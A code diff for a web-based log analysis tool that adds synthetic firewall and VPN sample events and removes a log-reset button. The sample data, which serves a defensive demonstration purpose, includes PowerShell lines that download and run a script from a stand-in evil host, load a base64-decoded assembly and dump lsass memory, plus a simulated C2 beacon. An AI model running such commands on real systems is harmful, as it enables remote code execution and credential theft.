@@ -724,7 +724,6 @@
   <select id="caseSel" class="btn" style="display:none;max-width:240px" title="Switch active case"></select>
   <button class="btn" id="newCaseBtn" style="display:none" title="Start a new empty case (keeps existing cases)">+ New case</button>
   <button class="btn" id="delCaseBtn" style="display:none" title="Delete the active case (removes its logs permanently)">🗑</button>
-  <button class="btn" id="removeLogBtn" style="display:none">Remove Current Log</button>
   <button class="btn" id="sampleBtn">Load sample</button>
   <button class="btn primary" id="openBtn">Open file</button>
   <button class="btn" id="addBtn" style="display:none" title="Add more log files to the current case">+ Add logs</button>
@@ -4599,7 +4598,6 @@ function finishLoad(){
   $("detBtn").classList.remove("on"); updateDetBtn(); $("detChip").style.display="none";
   $("skipnote").textContent=skipped?(skipped.toLocaleString()+" lines skipped"):"";
   dashDirty=true; evDirty=true; setTab("dash");
-  $("removeLogBtn").style.display="inline-block";
   updateCatTabCounts();
   if(SERVER) $("addBtn").style.display="inline-block";
   if(!SERVER){ setCaseSources(computeClientSources());
@@ -5141,22 +5139,63 @@ function buildSampleEvents(){
   ps.push(ev(PS,PSP,4104,WS,"Microsoft-Windows-PowerShell/Operational",{ScriptBlockText:"IEX (New-Object Net.WebClient).DownloadString('http://download.evil.example.com/p.ps1')",Path:""},402));
   ps.push(ev(PS,PSP,4104,WS,"Microsoft-Windows-PowerShell/Operational",{ScriptBlockText:"$d=[Convert]::FromBase64String($e); [Reflection.Assembly]::Load($d)",Path:""},403));
   ps.push(ev(PS,PSP,4104,WS,"Microsoft-Windows-PowerShell/Operational",{ScriptBlockText:"Get-Process lsass | Out-Minidump -DumpFilePath C:\\Temp",Path:""},418));
-  return { sec, sys, ps, all:[...sec,...sys,...ps] };
+  // --- Firewall sample (pfSense-style) — kept in the Firewall section; correlates with the same attacker IP / C2 ---
+  const FW="pfSense-firewall.log", VPN="OpenVPN-vpn.log";
+  const fwe=(data,t)=>({ _src:FW, _cat:"firewall", Event:{ System:{ Provider:{Name:"Firewall"}, EventID:"", Computer:"pfSense", Channel:FW,
+    TimeCreated:{ SystemTime: at(t) } }, EventData:data } });
+  const vpne=(data,t)=>({ _src:VPN, _cat:"vpn", Event:{ System:{ Provider:{Name:"VPN"}, EventID:"", Computer:"vpn-gw01", Channel:VPN,
+    TimeCreated:{ SystemTime: at(t) } }, EventData:data } });
+  const fw=[], vpn=[];
+  // normal allowed traffic
+  fw.push(fwe({Action:"pass",Interface:"LAN",Protocol:"TCP",SourceIP:"10.0.0.11",SourcePort:"51002",DestIP:"10.0.0.5",DestPort:"443",Rule:"Allow LAN to server",Message:"pass in LAN TCP 10.0.0.11:51002 -> 10.0.0.5:443 (HTTPS) [Allow LAN to server]"},10));
+  // inbound port scan from the attacker
+  for(let i=0;i<5;i++) fw.push(fwe({Action:"block",Interface:"WAN",Protocol:"TCP",SourceIP:ATT,SourcePort:String(40000+i*7),DestIP:"10.0.0.5",DestPort:String([135,139,445,3389,5985][i]),Rule:"Default deny (WAN)",Message:"block in WAN TCP "+ATT+":"+(40000+i*7)+" -> 10.0.0.5:"+[135,139,445,3389,5985][i]+" [Default deny]"},288+i));
+  // blocked inbound RDP brute-force bursts
+  for(let i=0;i<4;i++) fw.push(fwe({Action:"block",Interface:"WAN",Protocol:"TCP",SourceIP:ATT,SourcePort:String(53400+i*3),DestIP:"10.0.0.5",DestPort:"3389",Rule:"Default deny (WAN)",Message:"block in WAN TCP "+ATT+":"+(53400+i*3)+" -> 10.0.0.5:3389 (RDP) [Default deny]"},300+i*4));
+  // allowed outbound C2 (beacon) — the firewall let this through
+  fw.push(fwe({Action:"pass",Interface:"WAN",Protocol:"TCP",SourceIP:"10.0.0.77",SourcePort:"49733",DestIP:ATT,DestPort:"443",DestHost:"c2.evil.example.com",Rule:"Allow LAN to any",Message:"pass out WAN TCP 10.0.0.77:49733 -> "+ATT+":443 (c2.evil.example.com) [Allow LAN to any]"},410));
+  fw.push(fwe({Action:"pass",Interface:"WAN",Protocol:"UDP",SourceIP:"10.0.0.77",SourcePort:"51888",DestIP:"10.0.0.1",DestPort:"53",Query:"c2.evil.example.com",Message:"pass out WAN UDP 10.0.0.77:51888 -> 10.0.0.1:53 (DNS c2.evil.example.com)"},411));
+  // blocked inbound SMB toward the file server
+  fw.push(fwe({Action:"block",Interface:"WAN",Protocol:"TCP",SourceIP:ATT,SourcePort:"55221",DestIP:"10.0.0.8",DestPort:"445",Rule:"Default deny (WAN)",Message:"block in WAN TCP "+ATT+":55221 -> 10.0.0.8:445 (SMB) [Default deny]"},428));
+  // --- VPN sample (OpenVPN-style) ---
+  vpn.push(vpne({User:"jdoe",Action:"connect",SourceIP:"203.0.113.24",AssignedIP:"10.8.0.6",Protocol:"UDP",Port:"1194",Message:"user 'jdoe' connected from 203.0.113.24, assigned 10.8.0.6"},40));
+  vpn.push(vpne({User:"asmith",Action:"connect",SourceIP:"203.0.113.51",AssignedIP:"10.8.0.7",Protocol:"UDP",Port:"1194",Message:"user 'asmith' connected from 203.0.113.51, assigned 10.8.0.7"},95));
+  // the rogue account connects over VPN from the attacker IP
+  vpn.push(vpne({User:"mallory",Action:"auth-fail",SourceIP:ATT,Reason:"bad password",Message:"AUTH_FAILED for 'mallory' from "+ATT+" (bad password)"},352));
+  vpn.push(vpne({User:"mallory",Action:"connect",SourceIP:ATT,AssignedIP:"10.8.0.14",Protocol:"UDP",Port:"1194",Message:"user 'mallory' connected from "+ATT+", assigned 10.8.0.14"},356));
+  vpn.push(vpne({User:"jdoe",Action:"disconnect",SourceIP:"203.0.113.24",Duration:"3600s",BytesRx:"48211",BytesTx:"12040",Message:"user 'jdoe' disconnected (duration 3600s)"},430));
+  vpn.push(vpne({User:"mallory",Action:"disconnect",SourceIP:ATT,Duration:"640s",BytesRx:"9911204",BytesTx:"1820551",Message:"user 'mallory' disconnected (duration 640s, 9.9 MB received)"},465));
+  return { sec, sys, ps, fw, vpn, all:[...sec,...sys,...ps,...fw,...vpn] };
+}
+// true when a case already holds events (so we can warn before replacing it with the sample)
+function hasLoadedLog(){
+  if(caseSources && caseSources.some(s=>(s.count||0)>0)) return true;
+  if(window.__meta && (window.__meta.count||0)>0) return true;
+  return SCROLL || rows.length>0;
 }
 function loadSample(){
+  if(hasLoadedLog() && !confirm("A log is already loaded.\n\nDo you want to replace it and load the sample log (event log + firewall + VPN)?")) return;
   let S; try{ S=buildSampleEvents(); }catch(err){ alert("Could not build sample: "+(err&&err.message||err)); return; }
   if(SERVER){
-    const fd=new FormData();
-    const add=(arr,name)=>fd.append("file", new Blob([arr.map(o=>JSON.stringify(o)).join("\n")],{type:"application/x-ndjson"}), name);
-    add(S.sec,"Security-sample.evtx"); add(S.sys,"Sysmon-sample.evtx"); add(S.ps,"PowerShell-sample.evtx");
-    uploadSampleToServer(fd);
+    uploadSampleToServer(S);
   } else {
     ingest(S.all, true);
   }
 }
-async function uploadSampleToServer(fd){
+async function uploadSampleToServer(S){
   try{
-    const j=await uploadWithProgress("/api/upload", fd, "loading sample");
+    const mk=(arr)=>new Blob([arr.map(o=>JSON.stringify(o)).join("\n")],{type:"application/x-ndjson"});
+    // 1) the main Windows event logs -> a fresh case
+    const fd=new FormData();
+    fd.append("file", mk(S.sec), "Security-sample.evtx");
+    fd.append("file", mk(S.sys), "Sysmon-sample.evtx");
+    fd.append("file", mk(S.ps),  "PowerShell-sample.evtx");
+    let j=await uploadWithProgress("/api/upload", fd, "loading sample");
+    // 2) firewall + VPN sample logs -> appended into their own sections (cat-tagged)
+    if(S.fw && S.fw.length){ const f2=new FormData(); f2.append("file", mk(S.fw), "pfSense-firewall.log");
+      j=await uploadWithProgress("/api/upload?mode=append&cat=firewall", f2, "loading firewall sample"); }
+    if(S.vpn && S.vpn.length){ const f3=new FormData(); f3.append("file", mk(S.vpn), "OpenVPN-vpn.log");
+      j=await uploadWithProgress("/api/upload?mode=append&cat=vpn", f3, "loading VPN sample"); }
     setProgressPct(100, "loading events into grid…");
     await loadSessionFromServer(j.meta);
     if(navigator.onLine!==false){ try{ defaultRulesTried=true;
@@ -5165,7 +5204,6 @@ async function uploadSampleToServer(fd){
   }catch(err){ showProgress(false); alert("Sample failed to load: "+(err&&err.message||err)); }
 }
 $("sampleBtn").onclick=loadSample; $("sampleBtn2").onclick=loadSample;
-$("removeLogBtn").onclick=removeCurrentLog;
 /* light / dark theme (remembered in this browser) */
 function applyTheme(t){ document.body.classList.toggle("light", t==="light");
   $("themeBtn").textContent = t==="light" ? "☀" : "🌙";
@@ -5636,7 +5674,7 @@ async function enterScrollMode(meta){
   $("detBtn").classList.remove("on"); updateDetBtn(); $("detChip").style.display="none";
   $("skipnote").textContent="";
   dashDirty=true; evDirty=true; setTab("dash");
-  $("removeLogBtn").style.display="inline-block"; $("addBtn").style.display="inline-block";
+  $("addBtn").style.display="inline-block";
 }
 function seedKeysFromCache(){ const seen=new Set(allKeys);
   for(const r of bodyCache.values()){ if(!r)continue; for(const k in r.data){ if(!seen.has(k)){ seen.add(k); allKeys.push(k);} } } }
@@ -5909,21 +5947,6 @@ function updateWindowBanner(meta){
 async function updateRulesCountsFromServer(){
   try{ const r=await api("/api/rules"); const j=await r.json();
     $("rulesCounts").textContent=(j.rules.sigmaFiles||0)+" sigma · "+(j.rules.yaraFiles||0)+" yara files (server)"; }catch(_){}
-}
-async function removeCurrentLog(){
-  if(SERVER){ try{ await api("/api/reset",{method:"POST"}); }catch(_){} }
-  rows=[]; filtered=[]; detections=new Map(); flagged=new Set(); serverDet=null; serverWindowed=false;
-  SCROLL=false; bodyCache=new Map(); bodyPending=new Set(); sLevels=[];
-  evidCache=null; evidCacheCase=null; catCache={}; window.__catCounts=null;
-  providerCounts=new Map(); allKeys=[]; tsMin=tsMax=null; skipped=0; EVID=null; evDirty=true; dashDirty=true;
-  srcFilter=null; setCaseSources([]); catCount=0; updateCatTabCounts();
-  fullDash=null; fullDashCase=null; serverWindowed=false; serverOffset=0; rowBase=0;
-  $("fwWrap").innerHTML=""; $("vpnWrap").innerHTML="";
-  $("exportBtn").disabled=true; $("removeLogBtn").style.display="none"; $("addBtn").style.display="none";
-  const b=$("winBanner"); if(b)b.style.display="none";
-  $("empty").style.display="flex"; $("skipnote").textContent=""; setRulesStatus("");
-  updateDetBtn(); setTab("events");
-  showProgress(false);
 }
 async function serverInit(){
   let j=null;
